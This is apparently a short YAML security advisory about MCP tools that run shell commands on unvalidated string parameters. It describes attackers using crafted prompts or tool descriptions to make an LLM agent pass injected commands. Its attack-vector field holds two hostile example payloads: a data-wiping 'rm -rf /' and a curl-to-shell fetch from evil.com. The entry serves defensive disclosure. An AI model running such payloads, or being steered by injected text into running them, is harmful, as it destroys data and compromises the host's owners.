id: MAD-2025-0003
title: "Unconstrained Shell Execution in MCP Tools"
severity: critical
description: |
  MCP tools that expose shell/command execution capabilities without input
  constraints (no regex pattern, no enum, no maxLength) allow arbitrary
  command injection. An LLM agent can be manipulated into executing
  malicious system commands through these unconstrained parameters.
affected_tools_pattern: "Tools with names matching shell/exec/run/command patterns and string parameters lacking input validation"
attack_vector: |
  An attacker crafts prompts or tool descriptions that cause the LLM to
  pass malicious payloads (e.g., '; rm -rf /', '$(curl evil.com/shell.sh | sh)')
  to unconstrained command parameters. Without pattern validation, the tool
  executes arbitrary commands with the server's privileges.
impact: |
  Full system compromise, data destruction, ransomware deployment, lateral
  movement, cryptocurrency mining, and persistent backdoor installation on
  the MCP server host.
references:
